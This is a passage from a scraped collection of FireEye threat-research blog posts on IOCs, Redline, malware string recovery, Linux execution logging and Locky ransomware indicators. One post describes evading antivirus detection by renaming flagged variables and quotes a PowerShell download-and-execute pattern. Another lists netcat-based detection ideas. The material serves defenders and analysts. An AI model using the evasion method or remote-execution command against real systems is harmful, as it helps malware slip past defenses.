(Methodology) At the end of the day, John authored three new IOCs based on his current investigation. He knows that if he records the artifacts he identified from his investigation into the \"ACM-BOBBO\" system, he can apply that knowledge to the investigation of the host at 10.20.30.101. Once he collects information on 10.20.30.101 with his Redline portable collector, he'll be able to match IOCs against the Live Response data, which will let him identify known artifacts quickly prior to beginning Live Response analysis. Although John is using these IOCs to search systems individually, these same IOCs could be used to search for evidence of attacker activity across the enterprise. Armed with this set of IOCs, John sets out to hunt for evil on the host at \"10.20.30.101\". Stay tuned for our next blog post, seeing how this investigation develops. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2013/12/2013-armory.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2013-12-20",
                    "source": "www.fireeye.com"
                },
                "text": "Everyone likes something for free. And there is no better place to go to get free analysis, intelligence and tools than The Armory on M-Unition. During the past year, we've offered intelligence and analysis on new threat activity, sponsored open source projects and offered insight on free tools like Redline™ , all of which has been highlighted on our blog. In case you've missed it, here are some of our most popular posts: Challenges in Malware and Intelligence Analysis: Similar Network Protocols, Different Backdoors and Threat Groups In this post, Mandiant's Intel shares insight on threat activity. Specifically, two separate APT groups, using two different backdoors that had very similar networking protocols. Read more to learn what they found. New Release: OWASP Broken Web Applications Project VM Version 1.1 Chuck Willis overviews version 1.1 of the Mandiant-sponsored OWASP Broken Web Applications Project Virtual Machine (VM). If you are not familiar with this open source project, it provides a freely downloadable VM containing more than 30 web applications with known or intentional security vulnerabilities. Many people use the VM for training or self-study to learn about web application security vulnerabilities, including how to find them, exploit them, and fix them. It can also be used for other purposes such as testing web application assessment tools and techniques or understanding evidence of web application attacks. Back to Basics Series: OpenIOC Will Gibb and a few of his colleagues at Mandiant embark on a series going back to the basics and looking deeper at OpenIOC - how we got where we are today, how to make and use IOCs, and the future of OpenIOC. Check out related posts here: The History of OpenIOC , Back to the Basics , OpenIOC, IOC Writer and Other Free Tools. Live from Black Hat 2013: Redline, Turbo Talk, and Arsenal Sitting poolside at Black Hat USA 2013, Mandiant's Kristen Cooper chats with Ted Wilson about Redline in this latest podcast. Ted leads the development of Redline where he provides innovative investigative features and capabilities enabling both the seasoned investigator and those with considerably less experience to answer the question, \"have you been compromised?\" Utilities Industry in the Cyber Targeting Scop e Our intel team is back again, this time with an eye on the utilities industry. As part of our incident response and managed defense work, Mandiant has observed Chinese APT groups exploiting the computer networks of U.S. utilities enterprises servicing or providing electric power to U.S. consumers, industry, and government. The most likely targets for data theft in this industry include smart grid technologies, water and waste management expertise, and negotiations information related to existing or pending deals involving Western utilities companies operating in China. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2013/10/openioc-basics.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2013-10-01",
                    "source": "www.fireeye.com"
                },
                "text": "Written by Will Gibb & Devon Kerr One challenge investigators face during incident response is finding a way to organize information about an attackers' activity, utilities, malware and other indicators of compromise, called IOCs. The OpenIOC format addresses this challenge head-on. OpenIOC provides a standard format and terms for describing the artifacts encountered during the course of an investigation. In this post we're going to provide a high-level overview of IOCs, including IOC use cases, the structure of an IOC and IOC logic. Before we continue, it's important to mention that IOCs are not signatures, and they aren't meant to function as a signature would. It is often understated, but an IOC is meant to be used in combination with human intelligence. IOCs are designed to aid in your investigation, or the investigations of others with whom you share threat intelligence. IOC Use Cases: There are several use cases for codifying your IOCs, and these typically revolve around your objectives as an investigator. The number of potential use cases is quite large, and we've listed some of the most common use cases below: Find malware/utility : This is the most common use case. Essentially, this is an IOC written to find some type of known malware or utility, either by looking for attributes of the binary, itself, or for some artifact created upon execution, such as a prefetch file or registry key. Methodology : Unlike an IOC written to identify malware or utilities, these IOCs find things you don't necessarily know about, in order to generate investigative leads. For example, if you wanted to identify any service DLL that wasn't signed and which was loaded from any directory that did not include the path \"windowssystem32\", you could write an IOC to describe that condition. Another good example of a methodology IOC is an IOC that looks for the Registry text value of all \"Run\" keys for a string ending \".jpg\". This represents an abnormal condition which upon investigation may lead to evidence of a compromise. Bulk : You may already be using this kind of IOC. Many organizations subscribe to threat intelligence feeds that deliver a list of MD5s or IP addresses; a bulk IOC can represent a collection of those indicators. These kinds of IOCs are very black and white and are typically only good for an exact match. Investigative : As you investigate systems in an environment and identify evidence of malicious activity such as metadata related to the installation of backdoors, execution of tools, or files being staged for theft, you can track that information in an IOC. These IOCs are similar to bulk IOCs; however, an investigative IOC only contains indicators from a single investigation. Using this type of IOC can help you to prioritize which systems you want to analyze. IOC components: An IOC is made up of three main parts: IOC metadata, references and the definition. Let's examine each one of these more closely, noting that we're using the Mandiant IOC Editor (IOCe) downloadable from the Mandiant website: Metadata : IOC metadata describes information like the author of the IOC (jsmith@domain.tld), the name of the IOC (Evil.exe (BACKDOOR) and a brief description such as \"This variant of the open source Poison Ivy backdoor has been configured to beacon to 10.127.10.128 and registers itself as \"Microsoft 1atent time services\". References : Within the IOC, references can find information like the name of an investigation or case number, comments and information on the maturity of the IOC such as Alpha, Beta, Release, etc. This data can help you to understand where the IOC fits in your library of threat intelligence. One common use for references is to associate an IOC with a particular threat group. It is not uncommon for certain references to be removed from IOCs when sharing IOCs with third parties. Definition : This is the content of the IOC, containing the artifacts that an investigator decided to codify in the IOC. For example, these may include the MD5 of a file, a registry path or something found in process memory. Inside the definition, indicators are listed out or combined into expressions that consist of two terms and some form of Boolean logic. One thing about the OpenIOC format that makes it particularly useful is the ability to combine similar terms using Boolean AND & OR logic. The previous example shows how this type of logic can be used. This type of IOC describes three possible scenarios: The name of a service is \"MS 1atent time services\" - OR - The ServiceDLL name for any service contains \"evil.exe\" - OR - The filename is \"bad.exe\" AND the filesize attribute of that file is within the range 4096 to 10240 bytes. When you use Boolean logic, remember the following: An AND requires that both sides of the expression are true An OR requires that one side of the expression is true Understanding that the Boolean statements, such as 'The name of a service is \"MS 1atent time services\", OR \"filename is \"bad.exe\" AND the filesize attribute of that file is within the range 4096 to 10240 bytes\"', are evaluated separately is an important aspect understanding how the logic within an IOC works. These statements are not if-else statements, nor do they both have to exist in order for the IOC to have a match. When investigating a host, if the \"MS 1atent time services\" service is present, this IOC would have a match; regardless of whether or not the malicious file the IOC described was present on the host as well. In our next post we're going to have a crash course in writing IOC definitions using the Mandiant IOC editor, IOCe. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2013/09/fill-web-historianshaped-hole-heart.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2013-09-19",
                    "source": "www.fireeye.com"
                },
                "text": "With the recent integration of Mandiant Web Historian™ into Mandiant Redline™ , you may be asking \"How do I review my Web History using Redline?\" If so, then follow along as I explain how to collect and review web history data in Redline - with a focus on areas where the workflow and features differ from that of Web Historian. For those of you unfamiliar with Redline, it is Mandiant's premier free tool, providing host investigative capabilities to help users find signs of malicious activity through memory and file analysis and the development of a threat assessment profile. Configuring Web History Data Collection Web Historian provided three options for choosing how to find web history data that you want to analyze: scan my local system, scan a profile folder, and parse an individual history file. Redline allows you to accomplish all three of these operations using a single option, Analyze this Computer , which is found under the Main Menu in the upper left corner. Specifying the path to a profile folder or a history file will require some additional configuration: Figure 1: Finding your web history data Web Historian (Left) vs. Redline (Right) Click on Analyze this Computer to begin configuring your analysis session. To ensure that Redline collects your desired web history data, click the link to Edit your script . On the View and Edit Your Script window are several options; take a look around and turn on any and all data that might interest you. For our purposes, we will be focusing on the Browser History options underneath the Network tab. This section contains all of the familiar options from Web Historian; simply select the boxes corresponding to the data you wish to collect. One difference you may notice is the absence of an option to specify the browser(s) you would like to target. You can now find that option by selecting Show Advanced Parameters from the upper right corner of the window. Once advanced parameters are enabled, simply type the name of any browser(s) you would like to target, each on its own separate line in the Target Browser field. To have Redline collect any web history data regardless of browser, just leave this field empty. You may also notice that enabling advanced parameters activates a field for History Files Location . As you may have guessed, this is where you can specify a path to a profile folder or history file to analyze directly, as you were able to do in Web Historian. Figure 2: Configuring Redline to Collect Browser History Data Now that you have finished configuring your script, choose a location to save your analysis session and then hit OK . Redline will run the script, which will require Administrator privileges and may trigger a UAC prompt before running depending on how your system is configured. After a brief collecting and processing time, your web history data will be ready for review. Reviewing your Data For the actual review of your web history data, you should feel right at home in Redline. Just like Web Historian, Redline uses a sortable, searchable, configurable table view for each of the individual categories of web history data. Figure 3: Displaying your web history data for review in both Web Historian (behind) and Redline (front) Although similar, Redline does have a few minor differences in how it visualizes your data: Redline does not break the data into pages; instead it will discretely page in large data sets (25k+ rows) automatically as you scroll down through the list. To configure the table view, you will need to manipulate the column headers for ordering and resizing, and right-click on a column header to show and hide columns - as opposed to using the column configuration menu in Web Historian. Searching and simple filtering is done in each individual table view and is not applied globally. To access the find options, either press the magnifying glass in the bottom right corner, or press Ctrl-f while a table view is selected. To export your data to a CSV (comma separated values) format file, click on export in the bottom right corner. Like Web Historian, Redline will only export data currently in the table view. If you applied any filtering or tags, those will affect the data as it is exported. In addition to the features that have always been available in Web Historian, Redline also allows you to review your web history with its full suite of analytical capabilities and investigative tools. Check out the Redline user guide for a full description of these capabilities. Here are just a few of the most popular: Timeline provides a chronological listing of all web-based events (e.g., URL last browsed to, File Download Started, etc.) in a single heterogeneous display. You can employ this to follow the activities of a user or attacker as they played out on the system. You can also quickly reduce your target investigative scope using the Timeline's powerful filtering capabilities. Use tags and comments to mark-up your findings as you perform your investigation, making it easier to keep track of what you have seen while moving forward. You can then go back and export those results into your favorite reporting solution. Use Indicators of Compromise (IOCs) as a quick way to determine if your system contains any potential security breaches or other evidence of compromise. Visit http://www.openioc.org/ to learn more about IOCs. Last but not least, Redline gives you the ability to examine an entire system worth of metadata. With Redline, you are not simply restricted to Web History related data; you can investigate security incidents with the scope and context of the full system. If your favorite feature from Web Historian has not yet been included in Redline (Graphing, Complex Filtering, etc.), feel free to make a request using one of the contact methods specified below. We will be taking feedback into consideration when choosing what the Redline team works on in the future. As always, feel free to contact us with send any additional questions. And just in case you do not already have it, the latest version of Redline (v1.10 as of the time of this writing) can always be found here . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/09/bypassing-antivirus-for-your-antivirus-bypass.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-09-13",
                    "source": "www.fireeye.com"
                },
                "text": "Chances are you have heard about how easy it can be to evade antivirus. Often, this is because the signatures used by vendors are too simplistic and can be successfully duped without changing the functionality of the malware. Have you ever attempted to evade AV? Is it really that easy? In this blog post, I’ll show you how I adapted “malicious” (not really) PowerShell script to slip by Windows Defender. One of my favorite PowerShell commands is iex (new-objectnet.webclient).downloadstring, which can be used to load a remotely hosted script directly into memory. This command is often behind reports of “fileless” malware and is regularly abused by red teams and criminals alike. AV detection of this method has improved somewhat recently but plenty of options exist to evade, such as invoke-obfuscation by @danielhbohannon . The MITRE ATT&CK framework includes a technique called “Indicator Removal from Tools” ( T1066 ), which describes how an adversary may alter a tool after it is detected in an attempt to evade defenses. T1066 is one reason why alerts for a tool being blocked should not be ignored. In researching this technique, I found that using my favorite command with PowerSploit’s Find-AVSignature.ps1 somewhat ironically resulted in a Windows Defender block… not-so-ironically, it was released in 2012. There have been many excellent posts on how to evade AV but, as the saying goes, “there is more than one way to skin a cat.”  To highlight how ridiculous AV can be, I decided to bypass AV detection of Find-AVSignature.ps1 while maintaining the spirit of “there is an easier way,” outlined in @obscuresec ’s blog post introducing Find-AvSignature. The key to my method is PowerShell’s built-in Invoke-Webrequest command (also known by the aliases \"iwr,\" \"wget,\" and \"curl\"). While Windows Defender will block calling Find-AvSignature.ps1 when attempting to use iex (new-object net.webclient).downloadstring… ...it will NOT block you from performing a wget on the page and then viewing the page’s content. Now we’re getting somewhere, but we can’t simply write the contents to disk. From here, we are going to find out where Defender is catching the file by writing the file to the disk one line at a time. After we find the line, we are going to break it into words and then reverse any variables found in the line. This will require a fairly simple script: From the output of the script, we can see that detection takes place on line 166 (167 for non-programmer types), which reads: $BytesLeft = $BytesLeft - $count ‍ Surely, we can't change the variable names! ‍ ‍ We could simply do a $page.content.replace twice to replace the two variables but why would we when we can over-complicate this? Let’s add logic to change the variable names for us by simply reversing the characters. Now the output reads: Detection at line 166 (counting from 0 ^,^) Replaced $BytesLeft with $tfeLsetyB Replaced $count with $tnuoc ‍ But does Find-AvSignature.ps1 still work? Yes, yes it does…. So, is this only Windows Defender sucking? No, no it is not… As you can see, it’s not only Windows Defender that is using a poorly chosen detection string – our small change detection went across several AV products. This begs some questions: How well does AV hold up to other techniques? Is that ok because you are covered elsewhere? More expansively, how well does your firewall, IDS/IPS, and Sandbox hold up? Could you adjust your defense strategy to compensate? Before you invest in another security tool to layer over the tons that you probably already have, ask yourself if it’s really the product or a change in configuration that is needed. Verodin SIP prescriptively shows you exactly what change you should make to optimize your security, so you can find solutions with what you already have in your network. To learn more, request a demo . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/02/recovering-stackstrings-using-emulation-with-ironstrings.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-02-28",
                    "source": "www.fireeye.com"
                },
                "text": "This blog post continues our Script Series where the FireEye Labs Advanced Reverse Engineering (FLARE) team shares tools to aid the malware analysis community. Today, we release ironstrings : a new IDAPython script to recover stackstrings from malware. The script leverages code emulation to overcome this common string obfuscation technique. More precisely, it makes use of our flare-emu tool, which combines IDA Pro and the Unicorn emulation engine. In this blog post, I explain how our new script uses flare-emu to recover stackstrings from malware. In addition, I discuss flare-emu ’s event hooks and how you can use them to easily adapt the tool to your own analysis needs. Introduction Analyzing strings in binary files is an important part of malware analysis. Although simple, this reverse engineering technique can provide valuable information about a program’s use and its capabilities. This includes indicators of compromise like file paths and domain names. Especially during advanced analysis, strings are essential to understand a disassembled program’s functionality. Malware authors know this, and string obfuscation is one of the most common anti-analysis techniques reverse engineers encounter. Due to the prevalence of obfuscated strings, the FLARE team has already developed and shared various tools and techniques to deal with them. In 2014 we published an IDA Pro plugin to automate the recovery of constructed strings in malware . In 2016, we released FLOSS ; a standalone open-source tool to automatically identify and decode strings in malware. Both solutions rely on vivisect , a Python-based program analysis and emulation framework. Although vivisect is a robust tool, it may fail to completely analyze an executable file or emulate its code correctly. And just like any tool, vivisect is susceptible to anti-analysis techniques. With missing, incomplete, or erroneous processing by vivisect, dependent tools cannot provide the best results. Moreover, vivisect does not provide an easy-to-use graphical interface to interactively change and enhance program analysis. I encountered all these shortcomings recently, when I analyzed a GandCrab ransomware sample (version 5.0.4, SHA256 hash: 72CB1061A10353051DA6241343A7479F73CB81044019EC9A9DB72C41D3B3A2C7). The malware contains various anti-analysis techniques to hinder disassembly and control-flow analysis. Before I could perform any efficient reverse engineering in IDA Pro, I had to overcome these hurdles. I used IDAPython to remove various anti-analysis instruction patterns which then allowed the disassembler to successfully identify all functions in the binary. Many of the recovered functions contained obfuscated strings. Unfortunately, my changes did not propagate to vivisect, because it performs its own independent analysis on the original binary. Consequently, vivisect still failed to recognize most functions correctly and I couldn’t use one of our existing solutions to recover the obfuscated strings. While I could have tried to feed my patches in IDA Pro back to vivisect or to create a modified binary, I instead created a new IDAPython script that does not depend on vivisect. Thus, circumventing the mentioned shortcomings. It uses IDA Pro’s program analysis and Unicorn’s emulation engine. The easy integration of these two tools is powered by flare-emu . Using IDA Pro instead of vivisect resolves multiple limitations of our previous implementations. Now changes that users make in their IDB file, e.g. by patching instructions to manually enhance analysis, are immediately available during emulation. Moreover, the tool more robustly supports different architectures including x86, AMD64, and ARM. Stackstrings: An Example The disassembly listing in Figure 1 shows an example string obfuscation from the sample I analyzed. The malware creates a string at run-time by moving each character into adjacent stack addresses (gray highlights). Finally, the sample passes the string’s starting offset as an argument to the InternetOpen API call (blue highlight). Manually following these memory moves and restoring strings by hand is a very cumbersome process. Especially if malware complicates value assignments using additional instructions like illustrated below. Figure 1: Disassembly listing showing stackstring creation and usage Because malware often uses stack memory to create such strings, Jay Smith coined the term stackstrings for this anti-analysis technique. Note that malware can also construct strings in global memory. Our new script handles both cases; strings constructed on the stack and in global memory. ironstrings: Stackstring Recovery Using flare-emu The new IDAPython script is an evolution of our existing solutions. It combines FLOSS’s stackstring recovery algorithm and functionality from our IDA Pro plugin. The script relies on IDA Pro’s program analysis and emulates code using Unicorn. The combination of both tools is powered by flare-emu . Fe , short for flare-emu , is the chemical symbol for iron and hence the script is named ironstrings . To recover stackstrings, ironstrings enumerates all disassembled functions in a program except for library and thunk functions as identified by IDA Pro. For each function, the script emulates various code paths through the function and searches for stackstrings based on two heuristics: Before all call instructions in the function. As stackstrings are often constructed and then passed to other functions, i.e. Windows APIs like CreateFile or InternetOpenUrl . At the end of a basic block containing more than five memory writes. The number of memory writes is configurable. This heuristic is helpful if the same memory buffer is used multiple times in a function and if the string construction spans multiple basic blocks. If any of these conditions apply, the script searches the function’s current stack frame for printable ASCII and UTF-16 strings. To detect strings in global memory, the script additionally searches for strings in all memory locations that have been written to. Using flare-emu Hooks to Recover Stackstrings If you’re not already familiar with flare-emu , I recommend reading our previous blog post . It discusses some of the interfaces the tool provides. Other helpful resources are the examples and the project documentation available on the flare-emu GitHub . The stackstrings script uses flare-emu ’s iterateAllPaths API. The function iterates multiple code paths through a function. It first finds possible paths from function start to function end. The tool then forces the emulation down all identified code paths independent from the actual program state. This extensive code coverage allows ironstrings to recover strings constructed from many different emulation runs. A key feature of flare-emu are the various hook functions that get triggered by different emulation events. These hooks, or callbacks, enable the development of very powerful automation tasks. The available hooks are a combination of Unicorn’s standard hooks, e.g., to hook memory access events, and multiple convenience hooks provided by flare-emu . The following section briefly describes the available callbacks in flare-emu and illustrates how the ironstrings script uses them to recover obfuscated strings. instructionHook: This Unicorn standard hook is triggered before an instruction is emulated. ironstrings uses this hook to initiate the stackstrings extraction if a basic block contained enough memory writes, for example. memAccessHook: This Unicorn standard hook is triggered when memory read or write events occur during emulation. In the stackstrings script this function stores data about all memory writes. callHook: This flare-emu hook is activated before each function call. The hook’s return value is ignored. In the stackstrings script this hook triggers the extraction of stackstrings. preEmuCallback: This flare-emu hook is called before each emulation run. It is only available in the iterate and the iterateAllPaths functions. The hook’s return value is ignored. ironstrings does not use this hook. targetCallback: This flare-emu hook gets called whenever one of the specified target addresses is hit. It is only available in the iterate and the iterateAllPaths functions. The hook’s return value is ignored. The stackstrings script does not use this hook. The code in Figure 2 shows the callback functions that flare-emu ’s API currently supports, their signatures, and examples of how to use them. All callbacks receive an argument named hookData. This named dictionary allows the user to provide application specific data to use before, during, and after emulation. Often, this dictionary is named userData in the user-defined callbacks, as in the examples below, due to its naming in Unicorn. ironstrings uses this to access function analysis data and store recovered strings across its various hooks. The dictionary also provides access to the EmuHelper object and emulation meta data. Figure 2: flare-emu example hook implementations Installation Download and install flare-emu as described at the GitHub installation page . ironstrings is available, along with our other IDA Pro plugins and scripts, at our ironstrings GitHub page . Note that both flare-emu and ironstrings were written using the new IDAPython API available in IDA Pro 7.0 and higher. They are not backwards compatible with previous program versions. Usage and Options To run the script in IDA Pro, go to File – Script File... (ALT+F7) and select ironstrings.py . The script runs automatically on all functions, prints its results to IDA Pro's output window, and adds comments at the locations where it recovered stackstrings. Figure 3 shows the script’s output of the recovered stackstring locations from the GandCrab sample. Analysis of this malware takes the script about 15 seconds. Figure 3: Deobfuscated stackstrings and locations where they were identified Figure 4 shows the disassembly listing of the stackstring creation example discussed at the beginning of this post after running ironstrings . Figure 4: Commented stackstring after running ironstrings After analyzing a sample, the script provides a summary and a unique listing of all recovered strings. The output for the ransomware sample is shown in Figure 5. Here the tool failed to analyze two functions due to invalid memory operations during Unicorn’s code emulation. Figure 5: Script summary and unique string listing Note that you can modify various options to change the script’s behavior. For example, you can configure the output format at the top of the ironstrings.py file. The script’s README file explains the options in more detail. Conclusion This blog post explains how our new IDAPython script ironstrings works and how you can use it to automatically recover stackstrings in IDA Pro. Overcoming anti-analysis techniques is just one of many useful applications of code emulation for malware analysis. This post shows that flare-emu provides the ideal base for this by integrating IDA Pro and Unicorn. The detailed discussion of flare-emu ’s hook functions will help you to write your own powerful automation scripts. Please reach out to us with questions, suggestions and feedback via the flare-emu and flare-ida GitHub issue trackers. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/11/extending_linux_exec.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2016-11-09",
                    "source": "www.fireeye.com"
                },
                "text": "Gaining insight into the files being executed on your system is a great first step towards improved visibility on your endpoints. Taking this a step further, centrally storing logs of file execution data so they can be used for detection and hunting provides an excellent opportunity to find evil on your network. A SIEM, and to some degree your entire security monitoring program, is only as good as the data you are collecting. Process execution data is incredibly valuable for enabling a multitude of detection and hunting scenarios, which means it’s something you should consider collecting and storing. Customers of our Threat Analytics Platform (TAP) cloud-based SIEM solution frequently ask us about tools that can help them collect this type of file execution data. For Windows systems, our detection team typically recommends the Sysinternals Sysmon tool since it provides excellent visibility into the type of files that are being executed on your Windows machines and both integrates and scales well when properly deployed. In this post, I’m going to talk about a lesser-known feature of the Linux architecture called the Integrity Measurement Architecture (IMA). When coupled with auditd, IMA will allow you to achieve on Linux hosts a similar executable logging capability as the Sysmon tool for Windows. The Integrity Measurement Architecture is a component of the Linux kernel’s integrity subsystem. For this post, we’re going to focus on a minimum baseline configuration and policy in order to get file execution logs into a format that can be ingested by your SIEM. File execution logs are available in various forms and locations in Linux, but the logs we will be generating contain a wealth of data in one location that would otherwise need to be gathered from several disparate sources or may have not have been available at all. First, you should familiarize yourself with documentation for your Linux distribution to verify whether the IMA kernel compilation options are enabled by default. The IMA subsystem has been part of the mainline kernel since version 2.6.30, but not every distribution compiles their kernel with these options enabled. All of the examples in this post were tested on Ubuntu 16.04.1 LTS, as the IMA kernel options are enabled by default in this distribution. Instructions for compiling a kernel with these options enabled are listed in this Integrity Measurement Architecture documentation . Documentation for auditd can be found here . The reason we need the auditd daemon is because it is the userspace component for Linux’s auditing platform and it is responsible for writing all the resulting audit records to disk. Without auditd, the logs for the events we will be generating would never get written out to disk. The stated goals of the IMA subsystem are “to detect if files have been accidentally or maliciously altered, both remotely and locally, appraise a file’s measurement against a ‘good’ value stored as an extended attribute, and enforce local file integrity.” To achieve these goals, IMA provides several functions, including: Collect – “measure” a file before it is accessed. The term measurement in this context means to grab a hash of the file data, the hash of some file metadata and the file path, and then store this data in a runtime measurement list. Store – add the measurement to a kernel resident list and, if a hardware Trusted Platform Module (TPM) is present, extend the IMA Platform Configuration Register (PCR). TPM and PCR are part of an international standard for dedicated microcontrollers intended to secure hardware. Attest – if present, use the TPM to sign the IMA PCR value to allow a remote validation of the measurement list. Appraise – enforce local validation of a measurement against a “good” value stored in an extended attribute of the file. Protect – protect a file’s security extended attributes (including appraisal hash) against off-line attack. Collect & Store Part of the way the appraisal function validates a file is to calculate a hash value, which just determines how mathematically unique the file is, and compare this value against a stored “good” hash value. The specific hash function that IMA uses is a configurable option. Attest This is effective for locally ensuring integrity of an environment, but what if we also wanted to compare these measured hash values against a list of known bad file hashes through an external or internal blacklist? It could also be the case that runtime integrity checking on every machine isn’t suitable for your environment. Generating and storing these logs opens up the possibility for future investigation as well as centralized detection capabilities if your organization is ingesting these logs into a single repository. Appraise We can utilize the auditing function of IMA to generate a log every time IMA measures an executable. When an IMA policy is set to audit any executable and auditd is running, a log will be written containing metadata for each executable. The simplest IMA policy we can write to log all executables looks like this: audit func=BPRM_CHECK mask=MAY_EXEC There are several ways to apply this policy to IMA that are detailed in the IMA documentation. Later versions of systemd will apply a custom policy located in “/etc/ima/ima-policy”. Placing the single line policy set forth above in this file will cause systemd to apply this IMA policy to the system. This version of systemd was included in Ubuntu 16.04.1. It should be noted that the example policy is extremely broad and will result in a high volume of logs being generated, primarily by daemons – equivalent to a Windows service - performing routine tasks, such as systemd. The policy can be further restricted by file magic values, UID, filesystem mask values and several others, as specified by the policy documentation . This policy will produce audit INTEGRITY_RULE logs that look like this: This gives us several great pieces of information for searching and correlation in a SIEM: the path of the file that was executed (kaiten.bin) and the path of its parent (/bin/bash), the PID(8205) and parent PID(1943) of the executable, the SHA-1 hash value(48a3171d8f04c09f6d06362d4c4b995eaa97d489) of this file (or whatever hash value you configured IMA to use), and the UID, GID, etc., of the user that owned the process. A quick check in VirusTotal of the hash supplied to us by IMA in this example shows that this is a variant of the Kaiten IoT bot . Once you are generating logs with IMA and auditd, you can send them to your SIEM using your normal log ingestion process via something like syslog. Now that you’re ingesting these logs into your SIEM, there are all sorts of detection and hunting scenarios available: Using rules and ingestion decoration services (services that add additional metadata to a log at ingestion time) to check hashes against internal and or external blacklists. For example: o   VirusTotal o   Lists of hashes seen in public Linux honeypots o   Lists of samples seen in previous incidents Inspecting the path of the executable for abnormalities. For example: o   Binaries named as system utilities executing from unusual locations (/opt/app/sudo, /home/foo/su) o   Paths you wouldn’t expect to see with executable files (Executables in your web app’s image upload directory o   Binaries executing from hidden directories (/opt/.hidden/foo, /home/user/.hidden/bar) Checking specific UIDs and GIDs for unusual execution. For example: o   Web app user account attempting to use unusual utilities (top, netstat, su, etc.) o   An account under an archive service group attempting to execute something out of /tmp Checking specific parent executables and processes for unusual execution. For example: o   Communication broker executing directory traversal commands o   Apache process executing netcat Configuration options for both IMA and auditd are extensive so, if this post is of interest to your organization, I highly recommend reading the documentation for both IMA and auditd so they can be further customized to your needs. This post isn’t meant to be an all-inclusive guide to IMA, but our hope is that it introduces you to this capability so that you can dive in and make it useful for improving your visibility into Linux process execution and aid you in finding more evil in your network. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/03/surge_in_spam_campai.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2016-03-25",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye Labs is detecting a significant spike in Locky ransomware downloaders due to a pair of concurrent email spam campaigns impacting users in over 50 countries. Some of the top affected countries are depicted in Figure 1. Figure 1. Affected countries As seen in Figure 2, the steep spike starts on March 21, 2016, where Locky is running campaigns that coincide with the new Dridex campaigns that were discussed in the blog, “Stop Scanning My Macro”. Figure 2. Detection on spam delivered malware Prior to Locky’s emergence in February 2016, Dridex was known to be responsible for a relatively higher volume of email spam campaigns. However, as shown in Figure 3, we can see that Locky is catching up with Dridex’s spam activities. This is especially true for this week, as we are seeing more Locky-related spam themes than Dridex. On top of that, we also are seeing Dridex and Locky running campaigns on the same day, which resulted in an abnormal detection spike. Figure 3. Dridex versus Locky spam campaign over time Locky Ransomware spam The new Locky spam campaign uses several themes such as “invoice notice”, “attached image”, and “attached document themes”. See Figure 4 and Figure 5 for example campaign emails. Figure 4. Urgent Invoice Campaign Figure 5. Other Campaigns The ZIP attachment as depicted in Figure 6 contains a malicious JavaScript downloader that downloads and installs the Locky ransomware. Figure 6. Zipped Content In Figure 7, it is interesting to see that the recent Locky campaign seems to prefer using a JavaScript-based downloader in comparison to Microsoft Word and Excel macro-based downloaders, which were seen being used in its early days. Figure 7. Locky Downloader Mechanism The preference for JavaScript downloaders could be due to the ease to transform or obfuscate the script via automation to generate new variants as depicted in Figure 8. As a result, the traditional signature-based solution may not keep up with the variants where its behavioral intent is the same. At the time of discovery, most of the samples that we see are being detected by only one vendor, according to VirusTotal. Figure 8. Obfuscated JavaScript code Conclusions The volume of Locky ransomware downloaders observed is increasing and it may potentially replace the Dridex downloader as the top spammer. One of the latest victims of Locky is Methodist Hospital [1], where the victim was reportedly forced to pay a ransom to retrieve their encrypted data. This suggests that the cybercriminals are earning more from ransomware and this drives their aggressive campaigns. On top of that, JavaScript downloaders seem to be the preferred medium for delivering its payload as it could be easily obfuscated to create new variants. Technical Analysis of a Locky Payload Sample MD5 Sum: 3F118D0B888430AB9F58FC2589207988 (First seen on 2016-02-24 in VirusTotal) Persistence Mechanism The malware does not contain a persistence mechanism. An external tool or installer is required if the attacker desires persistence. The malware contains the ability to install the following registry key for persistence; this functionality is disabled in this variant. HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Locky <path_to_malware> File System Artifacts The malware encrypts files on the system and creates new files with the encrypted contents in the same directory with the following naming convention: <system identifier><16 random hex digits>.locky The <system identifier> value is the ASCII hexadecimal representation of the first eight bytes of the MD5 hash of the GUID of the system volume. The malware drops a ransom note provided by the C2 server in all directories with encrypted files and on the desktop of the current user: _Locky_recover_instructions.txt The malware drops an image on the desktop of the current user: _Locky_recover_instructions.bmp Registry Artifacts The malware creates the registry key HKCU\\Software\\Locky. id is set to a unique identifier generated for the compromised system. pubkey is set to a binary buffer that contains a public RSA key. paytext is set to a binary buffer containing the recovery instructions. completed is set to 1. The malware changes the desktop background to a bitmap containing the ransom instructions. HKCU\\Control Panel\\Desktop\\Wallpaper is set to: %CSIDL_DESKTOPDIRECTORY%\\_Locky_recover_instructions.bmp Network-Based Signatures Command and Control (CnC) The malware communicates with the following hard-coded hosts using HTTP over TCP port 80. The malware also uses a domain name generation algorithm as described below. 188.138.88.184 31.41.47.37 5.34.183.136 91.121.97.170 Beacon Packet The malware beacon builds a HTTP POST request to /main.php as shown in Figure 9. The POST data is encoded using a custom algorithm. Figure 9. HTTP POST request polling packet (general packet structure) Domain Generation Algorithm (DGA) This sample contains a domain name generation algorithm that is based on the current month, day and year. There are eight possible domains per day and the domains change on the first of the month and on even numbered days. Figure 10 contains Python code to generate the eight possible domain names for the current date. Figure 10. Locky Domain Generation Algorithm [1] http://arstechnica.com/security/2016/03/kentucky-hospital-hit-by-ransomware-attack/ Subscribe to Blogs Get email updates as new blog posts 